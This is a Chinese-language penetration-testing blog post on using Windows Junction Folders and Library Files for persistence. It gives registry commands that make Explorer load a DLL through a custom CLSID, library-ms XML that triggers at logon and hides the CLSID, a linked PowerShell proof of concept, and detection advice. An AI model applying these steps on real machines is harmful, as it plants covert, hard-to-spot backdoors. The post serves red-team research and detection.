---
layout: post
title: 渗透技巧——Junction Folders和Library Files的后门利用
---



## 0x00 前言
---

维基解密公布的CIA Vault 7中涉及到了Windows系统中Junction Folders和Library Files的利用

地址如下：

https://wikileaks.org/ciav7p1/cms/page_13763381.html
https://wikileaks.org/ciav7p1/cms/page_13763373.html

Jayden Zheng对此做了分析，分享了一个Library Files的后门利用方法，并且详细介绍了如何检测Junction Folders和Library Files的恶意利用

地址如下：

https://www.countercept.com/blog/hunting-for-junction-folder-persistence/

https://www.countercept.com/blog/abusing-windows-library-files-for-persistence/

本文将基于以上参考资料，比较Junction Folders和Library Files，对Library Files的后门利用方法做进一步利用(更加隐蔽)，开源一个POC，并且在检测上面分享自己的理解

## 0x01 简介
---

本文将要介绍以下内容：

- Junction Folders的利用方法
- Library Files的利用方法
- Library Files后门的进一步利用
- 检测和识别

## 0x02 Junction Folders的利用方法
---

Junction Folders可以简单理解为一个能够跳转到另一位置的文件夹

创建的三种常用方法：

- 修改注册表项
- 修改文件夹内的desktop.ini
- 使用特殊的文件名，例如test.{ED7BA470-8E54-465E-825C-99712043E01C}

对于第三种方法，特定的CLSID对应特定的文件路径

如果我们通过注册表创建一个CLSID，并指定dll路径，那么在打开该文件夹时，会加载该dll

### 1、实际测试

测试dll为执行计算器，可供参考的下载地址：

https://github.com/3gstudent/test/raw/master/calc.dll

#### (1)修改注册表，添加注册表项

bat命令如下：

```
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "c:\test\calc.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
```

#### (2)新建文件夹test.{11111111-1111-1111-1111-111111111111}

#### (3)选中该文件夹即可加载calc.dll

**注：**

只会加载一次，重启进程explorer.exe可以再次触发

### 2、系统开机自动加载的实现方法(用户权限)

#### (1)重命名系统文件夹

将`%appdata%\Microsoft\Windows\Start Menu\Programs\Accessories`重命名为`Accessories.{11111111-1111-1111-1111-111111111111}`

#### (2)新建文件夹

将文件夹test.{11111111-1111-1111-1111-111111111111}保存在以下任一位置：

- %appdata%\Microsoft\Windows\Start Menu\Programs\
- %appdata%\Microsoft\Windows\Start Menu\Programs\的子目录

## 0x03 Library Files的利用方法
---

文件后缀名为library-ms，位于`%appdata%\Microsoft\Windows\Libraries`

官方文档：

https://docs.microsoft.com/en-us/windows/client-management/windows-libraries

Library Files的简单理解：

能够同时显示多个文件夹中的内容

### 1、实际测试：

#### (1)修改注册表，添加注册表项

bat命令如下：

```
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\
REG.EXE ADD %KEY%InProcServer32 /VE /T REG_SZ /D "c:\test\calc.dll" /F
REG.EXE ADD %KEY%InProcServer32 /V ThreadingModel /T REG_SZ /D Apartment /F
REG.EXE ADD %KEY%ShellFolder /V Attributes /T REG_DWORD /D 4035969341 /F
```

**注：**

相比Junction Folders，Library Files需要多添加一个注册表项

#### (2)修改%appdata%\Microsoft\Windows\Libraries\Documents.library-ms

按照xml格式添加如下内容：

```
    <searchConnectorDescription publisher="Microsoft" product="Windows">
      <description>@shell32.dll,-34577</description>
      <isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
      <simpleLocation>
        <url>shell:::{11111111-1111-1111-1111-111111111111}</url>
      </simpleLocation>
    </searchConnectorDescription>
```

#### (3)访问%appdata%\Microsoft\Windows\Libraries\Documents.library-ms

打开文件时将多次加载dll，这里可以加一个互斥量避免多次启动，下载地址(仅作演示用)：

https://github.com/3gstudent/test/raw/master/calcmutex.dll

值得注意的地方：

`Includes`由`2 locations`变成`3 locations`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-14/2-1.png)


查看该位置，能够发现加载的CLSID，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-14/2-2.png)


### 2、系统开机自动加载的实现方法(用户权限)

将修改后的Documents.library-ms放在以下任一位置：

- %appdata%\Microsoft\Windows\Start Menu\Programs\
- %appdata%\Microsoft\Windows\Start Menu\Programs\的子目录

**注：**

还可以修改Music.library-ms和Pictures.library-ms，甚至是自己创建(可以指定显示的图标)

## 0x04 Library Files后门的进一步利用
---

对于Library Files的后门利用方法，最明显的特征是从`Includes`即可发现加载的CLSID

这里给出一个解决方法：

将路径清空，并且指定为不显示

成功隐藏加载的CLSID，最终的效果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-14/2-3.png)

### 1、实现方法

按照xml格式，清空原`<searchConnectorDescription>`，添加如下代码：

```
    <searchConnectorDescription publisher="Microsoft" product="Windows">
      <description>@shell32.dll,-34577</description>
      <isDefaultNonOwnerSaveLocation>false</isDefaultNonOwnerSaveLocation>
      <isSearchOnlyItem>true</isSearchOnlyItem>
      <simpleLocation>
        <url>shell:::{11111111-1111-1111-1111-111111111111}</url>
      </simpleLocation>
    </searchConnectorDescription>
```

### 2、通过powershell实现的POC

经测试，不需要指定`<ownerSID>`，可以使用固定模板

流程如下：

- 修改注册表
- 在指定目录释放Documents.library-ms

脚本编写需要注意的地方：

1. 需要指定输出的编码格式为UTF-8，默认为UTF-16(unicode)，会导致library-ms文件格式错误

2. 为了向字符串中传入变量$clsid，字符串的定义要使用双引号"，而不是单引号'

完整代码可参考：

https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-LibraryFilesPersistence.ps1

代码实现了添加注册表项并创建文件`%appdata%\Microsoft\Windows\Libraries\Documents.library-ms`，在用户登录时会加载`c:\test\calc.dll`

## 0x05 检测和识别
---

对于Junction Folders和Library Files的利用方法，特别的地方：

- 普通用户权限即可
- 文件格式不常见，欺骗性高

结合利用方法，可对每个环节进行检查：

1. 是否存在可疑dll
	payload必须为dll格式

2. 注册表CLISD下是否有可疑dll
可监控注册表的敏感位置`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID`和`HKEY_CURRENT_USER\Software\Classes\CLSID`

3. 对于Junction Folders，遍历文件夹，检查后缀名是否关联可疑CLSID
	对于Library Files，遍历library-ms文件，检查是否关联可疑CLSID
	这个可直接参考Jayden Zheng的脚本：
	https://gist.github.com/countercept/6890be67e09ba3daed38fa7aa6298fdf

## 0x06 小结
---

本文测试了Junction Folders和Library Files的利用方法，对Library Files的后门利用方法做进一步利用，用来增加隐蔽性，开源了POC并且介绍了脚本编写需要注意的地方，最后在检测上面分享自己的理解

 
 
---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

